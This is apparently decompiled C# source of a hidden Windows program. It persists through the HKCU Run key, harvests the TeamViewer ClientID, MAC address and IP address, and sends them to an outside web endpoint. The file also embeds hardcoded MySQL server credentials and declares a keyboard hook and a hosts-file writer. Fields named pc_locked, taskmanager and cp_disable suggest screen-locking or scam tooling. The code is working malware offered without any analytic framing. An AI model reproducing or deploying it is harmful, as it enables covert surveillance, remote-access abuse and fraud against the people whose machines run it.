using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;
using MySql.Data.MySqlClient;

namespace hardworking;

public class Form2 : Form
{
	private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

	private MySqlConnection conn;

	private string sMacAddress = string.Empty;

	private string mac;

	private string pc_locked;

	private string Teamviewerstring = string.Empty;

	private string country = "JP";

	private string cp_disable;

	private string taskmanager;

	private string host_file;

	private string path;

	private string connString = "SERVER=107.180.3.171; PORT=3306; DATABASE=computer_details; UID=computer_details; PASSWORD=admin@password";

	private IntPtr ptrHook;

	private LowLevelKeyboardProc objKeyboardProcess;

	private IContainer components;

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc callback, IntPtr hMod, uint dwThreadId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool UnhookWindowsHookEx(IntPtr hook);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr hook, int nCode, IntPtr wp, IntPtr lp);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string name);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern short GetAsyncKeyState(Keys key);

	public static bool ModifyHostsFile(string entry)
	{
		try
		{
			using StreamWriter streamWriter = File.AppendText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers\\etc\\hosts"));
			streamWriter.WriteLine(entry);
			return true;
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			return false;
		}
	}

	public Form2()
	{
		InitializeComponent();
		((Control)this).Hide();
		((Form)this).set_MinimizeBox(false);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_ControlBox(false);
		GetTeamviewerID();
		method_0();
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		foreach (NetworkInterface networkInterface in allNetworkInterfaces)
		{
			if (sMacAddress == string.Empty)
			{
				networkInterface.GetIPProperties();
				sMacAddress = networkInterface.GetPhysicalAddress().ToString();
			}
		}
	}

	public static string GetTeamviewerID()
	{
		List<string> list = new string[7] { "4", "5", "5.1", "6", "7", "8", "14" }.Reverse().ToList();
		string[] array = new string[2] { "SOFTWARE\\TeamViewer", "SOFTWARE\\Wow6432Node\\TeamViewer" };
		foreach (string text in array)
		{
			if (Registry.LocalMachine.OpenSubKey(text) == null)
			{
				continue;
			}
			foreach (string item in list)
			{
				string name = $"{text}\\Version{item}";
				if (Registry.LocalMachine.OpenSubKey(name) != null)
				{
					object value = Registry.LocalMachine.OpenSubKey(name)!.GetValue("ClientID");
					if (value != null)
					{
						return Convert.ToInt32(value).ToString();
					}
				}
			}
		}
		return string.Empty;
	}

	private void Form2_Load(object sender, EventArgs e)
	{
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Expected O, but got Unknown
		RegistryKey? registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey!.SetValue("mac testing", Application.get_ExecutablePath().ToString());
		string empty = string.Empty;
		empty = Dns.GetHostName();
		Console.WriteLine("Local Machine's Host Name: " + empty);
		IPAddress[] addressList = Dns.GetHostEntry(empty).AddressList;
		string text = string.Empty;
		for (int i = 0; i < addressList.Length; i++)
		{
			text = addressList[i].ToString();
		}
		WebBrowser val = new WebBrowser();
		string currentDirectory = Directory.GetCurrentDirectory();
		val.set_Url(new Uri(string.Format("http://gncmdstore.com/api_update.php?id=" + sMacAddress + "& ip=" + text + "& TeamViewer_id=" + Teamviewerstring + "& country=" + country, currentDirectory)));
		val.set_ScriptErrorsSuppressed(true);
		((Control)new Form1()).Show();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(116, 0));
		((Control)this).set_Name("Form2");
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("C");
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)Form2_Load);
		((Control)this).ResumeLayout(false);
	}

	[CompilerGenerated]
	private long method_0()
	{
		//IL_008d: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string name = (Environment.Is64BitOperatingSystem ? "SOFTWARE\\Wow6432Node\\TeamViewer" : "SOFTWARE\\TeamViewer");
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name);
			if (registryKey == null)
			{
				return 0L;
			}
			object value = registryKey.GetValue("ClientID");
			Teamviewerstring = value.ToString();
			if (value != null)
			{
				return Convert.ToInt64(value);
			}
			foreach (string item in registryKey.GetSubKeyNames().Reverse())
			{
				value = registryKey.OpenSubKey(item)!.GetValue("ClientID");
				MessageBox.Show(value.ToString());
				if (value != null)
				{
					return Convert.ToInt64(value);
				}
			}
			return 0L;
		}
		catch (Exception)
		{
			return 0L;
		}
	}
}
